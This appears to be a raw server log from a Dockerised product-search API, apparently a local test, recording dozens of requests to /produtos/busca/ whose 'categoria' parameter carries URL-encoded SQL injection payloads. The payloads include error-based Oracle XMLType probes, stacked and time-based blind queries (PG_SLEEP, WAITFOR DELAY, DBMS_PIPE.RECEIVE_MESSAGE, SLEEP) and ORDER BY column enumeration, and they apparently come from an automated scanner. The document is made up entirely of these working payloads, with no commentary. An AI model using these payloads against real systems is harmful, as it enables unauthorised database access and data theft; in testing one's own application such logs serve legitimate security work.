api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5900%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285900%3D5900%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27TkYC%27%3D%27TkYC HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F5900%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285900%3D5900%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27LTtH%27%3D%27LTtH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F5900%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285900%3D5900%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285553%3D5553 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F5900%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285900%3D5900%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F5900%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285900%3D5900%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FOSUh HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qzqkq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284542%3D4542%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvxjq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%28100%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%28100%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%28100%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%28100%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6528%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZADn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27oAPO%27%3D%27oAPO HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6528%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZADn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ROyN%27%3D%27ROyN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6528%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZADn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281226%3D1226 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6528%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZADn%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6528%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29ZADn%29--%2F%2A%2A%2FmBRk HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5232%3D%28SELECT%2F%2A%2A%2F5232%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wAwq%27%3D%27wAwq HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F5232%3D%28SELECT%2F%2A%2A%2F5232%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Eqhz%27%3D%27Eqhz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F5232%3D%28SELECT%2F%2A%2A%2F5232%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288695%3D8695 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F5232%3D%28SELECT%2F%2A%2A%2F5232%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F5232%3D%28SELECT%2F%2A%2A%2F5232%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FdvXo HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wfwe%27%3D%27wfwe HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27aAdB%27%3D%27aAdB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%286648%3D6648 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FyEoA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4296%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27gUnV%27%3D%27gUnV HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F4296%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27kWMg%27%3D%27kWMg HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F4296%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281677%3D1677 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F4296%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%2872%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F4296%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%2872%29%2C5%29--%2F%2A%2A%2FnLaE HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FopiF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9378--%2F%2A%2A%2FAIcH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FqMIY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6715--%2F%2A%2A%2FLSpW HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FjFxK HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3866--%2F%2A%2A%2FJKCd HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Fuzet HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6643--%2F%2A%2A%2FMZyq HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Fzlyy HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2211--%2F%2A%2A%2FLdTZ HTTP/1.1
